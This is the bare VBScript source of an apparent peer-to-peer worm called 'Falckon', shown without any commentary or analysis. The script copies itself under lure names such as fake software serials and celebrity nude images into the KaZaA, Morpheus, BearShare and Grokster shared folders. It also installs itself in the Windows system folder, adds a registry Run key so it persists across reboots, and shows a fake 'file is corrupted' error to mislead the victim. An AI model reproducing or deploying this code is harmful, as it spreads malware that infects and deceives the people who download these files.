On Error Resume Next
Dim Falckon
Dim MTNRAfso,MTNRAws,MTNRAfiles
Dim MTNRAkaz
Dim MTNRAmor
Dim MTNRAbear
Dim MTNRAprfi
Dim MTNRAwrm
Dim MTNRAwin
Dim MTNRAgrok
Set MTNRAfso = CreateObject("Scripting.fileSystemobject")
Set MTNRAws = CreateObject("Wscript.Shell")
Set MTNRAwin = MTNRAfso.GetSpecialFolder(1)
MTNRAfiles = Array("Visual Basic 6 Serial","Delphi 7 Serial","Delphi Enterprise Edition","FireWorks 4","Virtual Girl Lorena","Virtual Girl","Sex.jpg","KylieMinogue_nude_sex","ShakiraNaked.jpg","ShakiraAllBody.jpg")
MTNRAwrm = Wscript.ScriptFullName
MTNRAprfi = MTNRAws.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
MTNRAkaz = MTNRAprfi & "\KaZaA\My Shared Folder\"
If MTNRAfso.FolderExists(MTNRAkaz) = True Then
For MTNRAcop = 0 To 9
MTNRAfso.copyfile MTNRAwrm,MTNRAkaz &MTNRAfiles(MTNRAcop) & ".vbs"
Next
End If
MTNRAmor = MTNRAprfi & "\Morpheus\My Shared Folder\"
If MTNRAfso.FolderExists(MTNRAmor) = True Then
For MTNRAs = 0 To 9
MTNRAfso.copyfile MTNRAwrm,MTNRAmor &MTNRAfiles(MTNRAs) & ".vbs"
Next
End If
MTNRAbear = MTNRAprfi & "\bearshare\shared\"
If MTNRAfso.FolderExists(MTNRAbear) = True Then
For MTNRAz = 0 To 9
MTNRAfso.copyfile MTNRAwrm, MTNRAbear & MTNRAfiles(MTNRAz) & ".vbs"
Next
End If
MTNRAgrok = MTNRAprfi & "\Grokster\My Grokster\"
If MTNRAfso.FolderExists(MTNRAgrok) = True Then
For MTNRAa = 0 To 9
MTNRAfso.copyfile MTNRAwrm,MTNRAgrok & MTNRAfiles(MTNRAa) & ".vbs"
Next
End If
MTNRAfso.copyfile MTNRAwrm, MTNRAwin & "\" & Wscript.ScriptName
MTNRAws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Falckon", MTNRAwin & "\" & Wscript.ScriptName
MsgBox "The file is corrupted",0,"Error"
Set MTNRAws = Nothing
Set MTNRAfso = Nothing

